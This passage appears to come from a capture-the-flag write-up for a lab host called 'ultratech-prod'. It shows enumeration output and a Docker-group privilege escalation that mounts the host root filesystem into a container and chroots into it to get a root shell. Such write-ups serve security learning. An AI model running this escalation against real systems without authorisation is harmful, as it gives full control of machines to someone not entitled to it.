root       760  0.6  2.0 169088  9768 ?        Ssl  20:39   0:02 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       762  0.0  0.5 286236  2560 ?        Ssl  20:39   0:00 /usr/lib/accountsservice/accounts-daemon
root       771  0.0  0.3  30028  1872 ?        Ss   20:39   0:00 /usr/sbin/cron -f
root      1004  0.0  0.3  57500  1828 ?        S    20:40   0:00  \_ /usr/sbin/CRON -f
www       1006  0.0  0.0   4628   252 ?        Ss   20:40   0:00  |   \_ /bin/sh -c sh /home/www/api/start.sh
www       1007  0.0  0.0   4628   300 ?        S    20:40   0:00  |       \_ sh /home/www/api/start.sh
www       1011  5.0  3.5 1162992 17384 ?       Sl   20:40   0:15  |           \_ node index.js
root      1572  0.0  0.6  57500  3112 ?        S    20:45   0:00  \_ /usr/sbin/CRON -f
www       1573  0.0  0.1   4628   772 ?        Ss   20:45   0:00      \_ /bin/sh -c sh /home/www/api/start.sh
www       1574  0.5  0.1   4628   768 ?        S    20:45   0:00          \_ sh /home/www/api/start.sh
www       1577 52.8  3.7 654244 18440 ?        Rl   20:45   0:06              \_ node index.js
syslog     774  0.1  0.4 267272  2392 ?        Ssl  20:39   0:00 /usr/sbin/rsyslogd -n
root       776  0.0  0.2  28676  1440 ?        Ss   20:39   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       795  0.0  0.3  72296  1836 ?        Ss   20:39   0:00 /usr/sbin/sshd -D
root      1209  0.1  0.5 107984  2816 ?        Ss   20:40   0:00  \_ sshd: r00t [priv]
r00t      1298  0.0  0.5 107984  2728 ?        S    20:41   0:00      \_ sshd: r00t@pts/0
r00t      1299  0.3  0.9  21480  4576 pts/0    Ss   20:41   0:00          \_ -bash LANG=en_US.UTF-8 USER=r00t LOGNAME=r00t HOME=/home/r00t PATH=/usr/local/s
r00t      1594  0.0  0.7  38524  3576 pts/0    R+   20:45   0:00              \_ ps auxef LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:
root       806  0.0  0.2  14664  1264 ttyS0    Ss+  20:39   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.2  14888  1020 tty1     Ss+  20:39   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       821  0.0  0.5 291464  2504 ?        Ssl  20:39   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       838  0.2  2.3 625804 11324 ?        Ssl  20:39   0:00 /usr/lib/snapd/snapd
root       857  0.6  2.1 185908 10264 ?        Ssl  20:39   0:01 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-sign
root       972  0.1  1.4 335320  7200 ?        Ss   20:39   0:00 /usr/sbin/apache2 -k start
www-data   999  0.0  1.0 339724  4960 ?        S    20:39   0:00  \_ /usr/sbin/apache2 -k start
www-data  1000  0.0  1.0 339724  4960 ?        S    20:39   0:00  \_ /usr/sbin/apache2 -k start
www-data  1001  0.0  1.0 339724  4960 ?        S    20:39   0:00  \_ /usr/sbin/apache2 -k start
www-data  1002  0.0  1.0 339724  4960 ?        S    20:39   0:00  \_ /usr/sbin/apache2 -k start
www-data  1003  0.0  1.0 339724  4960 ?        S    20:39   0:00  \_ /usr/sbin/apache2 -k start
mysql      998  1.0 33.4 1154564 162996 ?      Sl   20:39   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
r00t      1080  0.2  0.4  76624  2040 ?        Ss   20:40   0:00 /lib/systemd/systemd --user LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:
r00t      1086  0.0  0.4 259156  2376 ?        S    20:40   0:00  \_ (sd-pam)
root      1587  0.0  0.1   4628   768 ?        Ss   20:45   0:00 /bin/sh /usr/lib/apt/apt.systemd.daily install
root      1593  0.0  0.3  41996  1532 ?        R    20:45   0:00  \_ apt-config shell StateDir Dir::State/d
```

`r00t` is in the `docker` group.

```bash
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

```bash
r00t@ultratech-prod:~$ sudo -l
[sudo] password for r00t:
Sorry, user r00t may not run sudo on ultratech-prod.
```

There is no useful command history for `r00t`.

```bash
r00t@ultratech-prod:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
lp1:x:1000:1000:lp1:/home/lp1:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:112:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
r00t:x:1001:1001::/home/r00t:/bin/bash
www:x:1002:1002::/home/www:/bin/sh
```

```bash
r00t@ultratech-prod:~$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,lp1
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:lp1
floppy:x:25:
tape:x:26:
sudo:x:27:lp1
audio:x:29:
dip:x:30:lp1
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:lp1
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
input:x:104:
crontab:x:105:
syslog:x:106:
messagebus:x:107:
lxd:x:108:lp1
mlocate:x:109:
uuidd:x:110:
ssh:x:111:
landscape:x:112:
lp1:x:1000:
mysql:x:113:
ssl-cert:x:114:
ftp:x:115:
r00t:x:1001:
docker:x:116:r00t
www:x:1002:
```

No extra network interfaces.

```bash
r00t@ultratech-prod:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:04:3f:b6:4f:83 brd ff:ff:ff:ff:ff:ff
    inet 10.10.119.228/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3100sec preferred_lft 3100sec
    inet6 fe80::4:3fff:feb6:4f83/64 scope link
       valid_lft forever preferred_lft forever
```

```bash
r00t@ultratech-prod:~$ route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         ip-10-10-0-1.eu 0.0.0.0         UG    100    0        0 eth0
10.10.0.0       0.0.0.0         255.255.0.0     U     0      0        0 eth0
ip-10-10-0-1.eu 0.0.0.0         255.255.255.255 UH    100    0        0 eth0
```

```bash
r00t@ultratech-prod:~$ arp -a
ip-10-10-0-1.eu-west-1.compute.internal (10.10.0.1) at 02:c8:85:b5:5a:aa [ether] on eth0
```

No extra services running on `localhost`.

```bash
r00t@ultratech-prod:~$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0    324 10.10.119.228:22        10.6.31.77:40296        ESTABLISHED on (0.23/0/0)
tcp6       0      0 :::8081                 :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::21                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::31331                :::*                    LISTEN      off (0.00/0/0)
udp        0      0 127.0.0.53:53           0.0.0.0:*                           off (0.00/0/0)
udp        0      0 10.10.119.228:68        0.0.0.0:*                           off (0.00/0/0)
raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     STREAM     LISTENING     14797    /run/systemd/journal/stdout
unix  9      [ ]         DGRAM                    14799    /run/systemd/journal/socket
unix  2      [ ]         DGRAM                    23399    /run/user/1001/systemd/notify
unix  2      [ ACC ]     SEQPACKET  LISTENING     14794    /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     23402    /run/user/1001/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     23406    /run/user/1001/gnupg/S.gpg-agent.browser
unix  2      [ ACC ]     STREAM     LISTENING     23407    /run/user/1001/gnupg/S.gpg-agent.extra
unix  2      [ ACC ]     STREAM     LISTENING     23408    /run/user/1001/gnupg/S.gpg-agent
unix  2      [ ACC ]     STREAM     LISTENING     23409    /run/user/1001/gnupg/S.gpg-agent.ssh
unix  2      [ ]         DGRAM                    14996    /run/systemd/journal/syslog
unix  2      [ ACC ]     STREAM     LISTENING     23410    /run/user/1001/gnupg/S.dirmngr
unix  7      [ ]         DGRAM                    15038    /run/systemd/journal/dev-log
unix  2      [ ACC ]     STREAM     LISTENING     15093    /run/lvm/lvmetad.socket
unix  2      [ ACC ]     STREAM     LISTENING     22864    /var/run/mysqld/mysqld.sock
unix  2      [ ACC ]     STREAM     LISTENING     18545    /var/lib/lxd/unix.socket
unix  2      [ ACC ]     STREAM     LISTENING     18508    @ISCSIADM_ABSTRACT_NAMESPACE
unix  2      [ ACC ]     STREAM     LISTENING     18515    /var/run/docker.sock
unix  2      [ ACC ]     STREAM     LISTENING     18509    /var/run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     18540    /run/snapd.socket
unix  2      [ ACC ]     STREAM     LISTENING     18542    /run/snapd-snap.socket
unix  2      [ ACC ]     STREAM     LISTENING     18555    /run/acpid.socket
unix  2      [ ACC ]     STREAM     LISTENING     18559    /run/uuidd/request
unix  3      [ ]         DGRAM                    14779    /run/systemd/notify
unix  2      [ ACC ]     STREAM     LISTENING     14782    /run/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     14792    /run/lvm/lvmpolld.socket
unix  3      [ ]         STREAM     CONNECTED     18927
unix  3      [ ]         STREAM     CONNECTED     24154
unix  3      [ ]         DGRAM                    16691
unix  3      [ ]         DGRAM                    14781
unix  3      [ ]         STREAM     CONNECTED     18894
unix  2      [ ]         DGRAM                    18127
unix  3      [ ]         STREAM     CONNECTED     17845    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     23304
unix  3      [ ]         STREAM     CONNECTED     18929    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     24155
unix  3      [ ]         DGRAM                    14780
unix  3      [ ]         STREAM     CONNECTED     18926
unix  3      [ ]         STREAM     CONNECTED     21488    /var/run/dbus/system_bus_socket
unix  2      [ ]         DGRAM                    23339
unix  3      [ ]         STREAM     CONNECTED     21064
unix  3      [ ]         STREAM     CONNECTED     18930    /var/run/dbus/system_bus_socket
unix  2      [ ]         DGRAM                    23317
unix  3      [ ]         STREAM     CONNECTED     20035
unix  3      [ ]         STREAM     CONNECTED     21366    /var/run/dbus/system_bus_socket
unix  3      [ ]         DGRAM                    17876
unix  3      [ ]         DGRAM                    23401
unix  3      [ ]         DGRAM                    16693
unix  3      [ ]         DGRAM                    16690
unix  3      [ ]         STREAM     CONNECTED     18069    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    16687
unix  3      [ ]         STREAM     CONNECTED     21487
unix  3      [ ]         STREAM     CONNECTED     21101    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     19241    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     18512
unix  3      [ ]         DGRAM                    16692
unix  3      [ ]         DGRAM                    17875
unix  2      [ ]         DGRAM                    18925
unix  2      [ ]         DGRAM                    17865
unix  3      [ ]         DGRAM                    23400
unix  3      [ ]         STREAM     CONNECTED     18928    /var/run/dbus/system_bus_socket
unix  2      [ ]         DGRAM                    23842
unix  3      [ ]         STREAM     CONNECTED     20379
unix  3      [ ]         STREAM     CONNECTED     17844
unix  3      [ ]         STREAM     CONNECTED     21639    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    17877
unix  3      [ ]         STREAM     CONNECTED     18511
unix  3      [ ]         STREAM     CONNECTED     21638
unix  3      [ ]         STREAM     CONNECTED     18067
unix  3      [ ]         STREAM     CONNECTED     23307    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     20118    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    17878
unix  3      [ ]         STREAM     CONNECTED     16654    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    15948
unix  3      [ ]         STREAM     CONNECTED     18893
unix  2      [ ]         DGRAM                    22690
unix  3      [ ]         DGRAM                    15949
unix  3      [ ]         STREAM     CONNECTED     15594
unix  3      [ ]         STREAM     CONNECTED     22702
unix  3      [ ]         STREAM     CONNECTED     21367    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     19958    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     15692    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     22830    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     22829
unix  3      [ ]         STREAM     CONNECTED     20655
unix  3      [ ]         STREAM     CONNECTED     19871    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     21362
unix  2      [ ]         DGRAM                    15311
unix  2      [ ]         DGRAM                    20548
unix  3      [ ]         STREAM     CONNECTED     19790
unix  3      [ ]         STREAM     CONNECTED     21824    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     18895    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     15662
unix  3      [ ]         STREAM     CONNECTED     21499    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    21348
unix  3      [ ]         STREAM     CONNECTED     22703    /var/run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     15693    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     21817
unix  2      [ ]         DGRAM                    15694
unix  3      [ ]         STREAM     CONNECTED     19955
unix  3      [ ]         STREAM     CONNECTED     19089    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     20454    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     19085
unix  3      [ ]         STREAM     CONNECTED     21228
unix  2      [ ]         DGRAM                    15664
unix  3      [ ]         STREAM     CONNECTED     16649
unix  3      [ ]         DGRAM                    16509
unix  3      [ ]         DGRAM                    16510
unix  3      [ ]         STREAM     CONNECTED     19165
```

---

## Docker Group Privilege Escalation

`r00t` is a member of the `docker` group, which is capable of issuing Docker commands without  `sudo`.

The only Docker image on the target is the official [bash](https://hub.docker.com/_/bash) one.

```bash
r00t@ultratech-prod:~$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        2 years ago         15.8MB
```

Use the following command to spawn a [bash](https://hub.docker.com/_/bash) container that mounts the system's root directory (`/`) to the container's `/mnt` directory and then changes the container's root to `/mnt`, effectively widening the container's scope to that of the system itself. This grants `root` access to the system.

```bash
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```
